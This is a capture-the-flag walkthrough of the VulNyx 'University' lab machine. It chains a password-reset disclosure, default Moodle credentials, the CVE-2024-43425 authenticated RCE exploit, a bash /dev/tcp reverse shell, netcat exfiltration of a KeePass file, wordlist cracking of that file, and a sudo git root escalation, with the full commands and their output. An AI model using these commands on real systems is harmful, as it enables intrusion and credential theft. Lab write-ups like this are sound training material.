# [VulNyx](https://vulnyx.com/): University Writeup  

<img width="845" height="436" alt="image" src="https://github.com/user-attachments/assets/e18e4538-2973-4b5f-bf63-3e3132e71831" />

---

# 🎯 Target Information

- **Platform:** VulNyx
- **Machine Name:** University
- **Target IP:** `192.168.1.52`
- **Key Vulnerabilities:**
  - Password Reset Information Disclosure
  - Default Credentials
  - Moodle 4.4.0 Authenticated RCE: CVE-2024-43425
  - KeePass Credential Extraction
  - Misconfigured Sudo Permissions
  - Privilege Escalation via `git`

---

# 🔎 Enumeration

First, perform a full TCP port scan against the target.

```bash
nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.52 -oX nmap-result.xml
```

## Scan Results

```text
$ nmap -n -Pn -sVC -p- --min-rate 5000 192.168.1.52 -oX nmap-result.xml
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-17 06:28 -0700
Nmap scan report for 192.168.1.52
Host is up (0.62s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:33:d4:c7:be:3a:d7:10:48:bb:d7:68:93:63:30:b4 (ECDSA)
|_  256 2a:85:0d:10:a5:76:aa:e2:b2:1a:8c:38:17:ae:62:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: University | Shaping the Future
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 08:00:27:14:2C:57 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.75 seconds
```

### Findings

- **22** → SSH
- **80** → Apache HTTP Server

The target is running Ubuntu with an Apache web server.

---

# 🌐 Web Enumeration

Before accessing the website, add the discovered hostname to `/etc/hosts`.

```bash
echo "192.168.1.52   university.nyx" | sudo tee -a /etc/hosts
```

Now open:

```text
http://university.nyx/
```

<img width="1918" height="783" alt="Screenshot_2026-08-17_06_33_38" src="https://github.com/user-attachments/assets/973a4583-9f45-41fe-af86-2ae11c6ecc3c" />

The website presents a university portal containing information about academic departments and other university-related sections.

---

# 🔍 Directory Enumeration

Use **Gobuster** to discover hidden directories and files.

```bash
gobuster dir -u http://university.nyx/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

## Results

```text
$ gobuster dir  -u http://university.nyx/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt      
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://university.nyx/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 279]
.hta                 (Status: 403) [Size: 279]
.htaccess            (Status: 403) [Size: 279]
administration       (Status: 301) [Size: 325] [--> http://university.nyx/administration/]
index.php            (Status: 200) [Size: 14730]
moodle               (Status: 301) [Size: 317] [--> http://university.nyx/moodle/]
phpinfo.php          (Status: 200) [Size: 87856]
server-status        (Status: 403) [Size: 279]
Progress: 4751 / 4751 (100.00%)
===============================================================
Finished
===============================================================
```

The most interesting discoveries are:

- `/administration/`
- `/moodle/`

---

# 🔐 Administration Portal

Navigate to:

```text
http://university.nyx/administration/
```

<img width="1918" height="476" alt="Screenshot_2026-08-17_06_38_47" src="https://github.com/user-attachments/assets/920c29e2-7aad-4bf7-9e97-c24926de86e2" />

The page presents an administration login portal containing a **Forgot Password?** option.

<img width="1918" height="465" alt="Screenshot_2026-08-17_06_42_58" src="https://github.com/user-attachments/assets/59cff48f-18a4-4deb-a4fc-57c39c2a82ec" />

Capture the password-reset request using **Burp Suite** for `admin` user and send the request to Repeater.

<img width="1918" height="565" alt="Screenshot_2026-08-17_06_43_26" src="https://github.com/user-attachments/assets/af166f66-7da9-49e9-992c-99276055d527" />

The response discloses a new password.

This allows us to log in to the administration account.

---

# 🖥 Administration Panel

After successfully logging in as `admin`, the administration panel displays statistics for students and faculty along with several administrative options.

<img width="1918" height="396" alt="Screenshot_2026-08-17_06_47_49" src="https://github.com/user-attachments/assets/be599504-91a6-4fea-81d7-da8333113932" />

Navigate to the **News** section.

<img width="1918" height="610" alt="Screenshot_2026-08-17_06_50_21" src="https://github.com/user-attachments/assets/f1d35956-2a8c-444c-b086-cef72ed76388" />

The news page contains default credentials intended for accessing the Moodle platform.

---

# 🎓 Moodle Enumeration

Navigate to:

```text
http://university.nyx/moodle/
```

Opening a course redirects to the university authentication page.

<img width="1918" height="626" alt="Screenshot_2026-08-17_07_41_06" src="https://github.com/user-attachments/assets/78541122-1286-4e07-ac18-d235f499daf6" />

The default credentials discovered in the administration panel were tested.

<img width="1918" height="672" alt="Screenshot_2026-08-17_07_43_43" src="https://github.com/user-attachments/assets/d596a143-729e-48f6-b8ad-61abd59c1eea" />

The following credentials were valid:

| Username | Password |
|----------|----------|
| `richard.feynman` | `Feynman#Quantum26` |

Using these credentials, we successfully authenticate as **Richard Feynman**.

---

# 🔍 Moodle Information Disclosure

After logging in, the Moodle interface exposes course information, including:

- Course ID

<img width="912" height="80" alt="Screenshot_2026-08-17_05_06_15" src="https://github.com/user-attachments/assets/6b4d249d-a7cb-4eef-a78d-5b6c4e2f8172" />
 
- Course module ID

<img width="953" height="165" alt="Screenshot_2026-08-17_05_06_04" src="https://github.com/user-attachments/assets/0b7c2a23-9a71-403e-8146-21fc936aa7ec" />

These values are required later when exploiting the Moodle vulnerability.

During further directory enumeration of the Moodle installation, a `/backup/` directory was discovered.

<img width="1918" height="746" alt="Screenshot_2026-08-17_07_52_27" src="https://github.com/user-attachments/assets/6106d853-cfde-4a93-87da-00f2f81fce3d" />

Inside the directory, an `upgrades.txt` file is present.

<img width="1918" height="478" alt="Screenshot_2026-08-17_07_52_54" src="https://github.com/user-attachments/assets/38d0b8ab-29da-4b0c-9102-df9e265da1a9" />

The file reveals that the installed Moodle version is:

```text
Moodle 4.4
```

---

# 💥 Moodle 4.4.0 Authenticated RCE

Moodle 4.4.0 contains an authenticated remote code execution vulnerability tracked as:

```text
CVE-2024-43425
```

An exploit is available through Exploit-DB.

Download the exploit:

```bash
wget https://www.exploit-db.com/download/52350 && mv 52350 52350.py
```

The exploit requires the previously discovered Moodle credentials along with the course ID and course module ID.

Execute the exploit with a harmless command first to verify command execution.

```bash
python 52350.py --url http://university.nyx/moodle/ \
--username richard.feynman \
--password Feynman#Quantum26 \
--courseid 3 --cmid 10 \
--cmd "id ; hostname"
```

## Result

```text
$ python 52350.py --url http://university.nyx/moodle/ --username richard.feynman --password Feynman#Quantum26 --courseid 3  --cmid 10 --cmd "id ; hostname"
[*] Step 1: GET /login/index.php to extract login token
[+] Found login token: fqs69SsXIiuc60cmYKFKE4ukU8RtDWOG
[*] Step 2: POST /login/index.php with credentials
[+] Logged in successfully.
[*] Extracting sesskey, courseContextId, and category from quiz edit page...
[+] Found sesskey: MEgQctVciw
[+] Found courseContextId: 20
[+] Found category: 4
[*] Step 3: Uploading calculated question with payload...
[+] Question upload request sent. Extracting question ID from redirect.
[*] Step 4: Completing dataset wizard with dataset[0]=0
[+] Reached expected error page. Payload is being interpreted.
[*] Step 5: Triggering command: {cmd}
[+] Trigger request sent. Output below:

[+] Command output (top lines):
uid=33(www-data) gid=33(www-data) groups=33(www-data)
university
              
```

Command execution is confirmed.

The Moodle instance is therefore vulnerable to authenticated RCE.

---

# 🐚 Reverse Shell

Start a Netcat listener on the attacker machine.

```bash
nc -lnvp 443
```

Use the Moodle exploit to execute a reverse-shell payload.

```bash
python 52350.py --url http://university.nyx/moodle/ \
--username richard.feynman \
--password Feynman#Quantum26 \
--courseid 3 --cmid 10 \
--cmd "bash -c 'bash -i > /dev/tcp/192.168.1.2/443 0>&1'"
```

The reverse shell connects back successfully.

```text
nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.52] 41084

id ; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
university
```

We now have shell access as:

```text
www-data
```

---

# 🖥 Shell Upgrade

Upgrade the reverse shell to a fully interactive TTY.

```bash
script /dev/null -c bash
```

Press:

```text
Ctrl + Z
```

Then run:

```bash
stty raw -echo; fg
```

```bash
reset xterm
```

```bash
export TERM=xterm
```

```bash
export BASH=bash
```

The shell is now upgraded to an interactive TTY.

---

# 🔑 KeePass Database Discovery

Search the filesystem for KeePass database files.

```bash
find / -type f -name "*.kdbx" 2>/dev/null
```

## Result

```text
www-data@university:/$ find / -type f -name *.kdbx 2>/dev/null
/opt/passwords.kdbx
www-data@university:/$ 
```

A KeePass database named `passwords.kdbx` is present in `/opt`.

---

# 📥 Transfer the KeePass Database

Transfer the database to the attacker machine using Netcat.

On the attacker machine:

```bash
nc -lnvp 4444 > passwords.kdbx
```

On the reverse-shell session:

```bash
nc 192.168.1.2 4444 < /opt/passwords.kdbx
```

The KeePass database is successfully transferred to the local machine.

---

# 🔓 Crack the KeePass Password

Use **keepass4brute** to recover the master password.

Download the tool:

```bash
wget https://raw.githubusercontent.com/r3nt0n/keepass4brute/refs/heads/master/keepass4brute.sh
```

Run it against the KeePass database using `rockyou.txt`.

```bash
bash keepass4brute.sh passwords.kdbx /usr/share/wordlists/rockyou.txt
```

## Result

```text
$ bash keepass4brute.sh passwords.kdbx /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 19/14344392 - Attempts per minute: 43 - Estimated time remaining: 33 weeks, 0 days
[+] Current attempt: ashley

[*] Password found: ashley
```

The KeePass master password is:

```text
ashley
```

---

# 🔐 KeePass Credential Extraction

Open the database using KeePassXC.

```bash
keepassxc passwords.kdbx
```

<img width="1918" height="515" alt="Screenshot_2026-08-17_08_13_32" src="https://github.com/user-attachments/assets/31f8b22b-c555-4ac4-84d8-6afc1346b928" />
<img width="1315" height="513" alt="Screenshot_2026-08-17_08_14_04" src="https://github.com/user-attachments/assets/e56a9d9a-d9fc-4082-a712-c35611037bd2" />

The database contains credentials for the `marcos` user.

```text
Username: marcos
Password: 3D852sW1as3b!
```

---

# 🖥 SSH Access as marcos

Use the recovered credentials to authenticate through SSH.

```bash
ssh marcos@192.168.1.52
```

Verify the current user.

```bash
id ; hostname
```

## Result

```text
$ ssh marcos@192.168.1.52
marcos@192.168.1.52's password: 
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-100-generic x86_64)

Last login: Mon Aug 17 12:20:57 2026 from 192.168.1.2

marcos@university:~$ id ; hostname
uid=1000(marcos) gid=1000(marcos) groups=1000(marcos)
university
marcos@university:~$ 
```

We successfully obtained SSH access as `marcos`.

---

# 🏁 User Flag

The user flag is located in the home directory.

```bash
cat user.txt
```

## Result

```text
marcos@university:~$ cat user.txt 
d4e8e6e9f8a2c3b7d1f5e9a0b6c7d2e4
```

---

# 🔍 Privilege Escalation

Check the sudo permissions available to `marcos`.

```bash
sudo -l
```

## Result

```text
marcos@university:~$ sudo -l
Matching Defaults entries for marcos on university:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User marcos may run the following commands on university:
    (root) NOPASSWD: /usr/bin/git
```

The `marcos` user can execute `/usr/bin/git` as root without entering a password.

This is an unsafe sudo configuration because Git provides functionality that can be abused to execute commands.

---

# 🐧 Privilege Escalation via Git

Using the known **GTFOBins** technique for Git.
<img width="1121" height="422" alt="Screenshot_2026-08-17_08_20_09" src="https://github.com/user-attachments/assets/a34abfd6-43f2-40da-ab50-9cb453466f07" />

Execute:

```bash
sudo -u root git branch --help config
```

Git opens its help page.

Inside the help interface, enter:

```text
!/bin/bash
```

Press **Enter**.

<img width="1918" height="363" alt="Screenshot_2026-08-17_08_20_52" src="https://github.com/user-attachments/assets/e861931f-3786-4fdf-b13e-99516df36d5f" />

This spawns a shell with root privileges.

Verify the current privileges:

```bash
id
```

## Result

```text
root@university:/home/marcos# id
uid=0(root) gid=0(root) groups=0(root)
root@university:/home/marcos# 
```

We successfully obtained a root shell.

---

# 🏁 Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

## Result

```text
root@university:/home/marcos# cat /root/root.txt
7b9f2e1a4c6d8f0e3a5b9c2d7e1f4a6b
```

---

# 🧾 Summary

| Phase | Technique |
|--------|-----------|
| Enumeration | Nmap |
| Web Enumeration | Gobuster |
| Information Disclosure | Administration Password Reset |
| Credential Discovery | Default Moodle Credentials |
| Initial Access | Moodle Authenticated RCE |
| Remote Access | Reverse Shell |
| Credential Discovery | KeePass Database |
| Password Cracking | keepass4brute |
| Lateral Movement | SSH as `marcos` |
| Privilege Escalation | Misconfigured Sudo |
| Root Access | Git Help Command Execution |
| Flags | User + Root |

---

# 🚀 Key Takeaways

- Password-reset functionality should never disclose sensitive credentials directly in HTTP responses.
- Default credentials should always be changed before deploying applications into production.
- Sensitive backup and upgrade files should not be publicly accessible.
- Keeping software updated is essential because known vulnerabilities such as `CVE-2024-43425` can provide authenticated remote code execution.
- Sensitive credential stores such as KeePass databases should be protected from unauthorized filesystem access.
- Strong and unique passwords should be used for password databases.
- Sudo permissions should follow the principle of least privilege.
- Powerful utilities such as `git` should not be granted unrestricted root execution through sudo unless there is a specific and secure operational requirement.

---

## **Author:** [zer0arc4](https://github.com/zer0arc4)
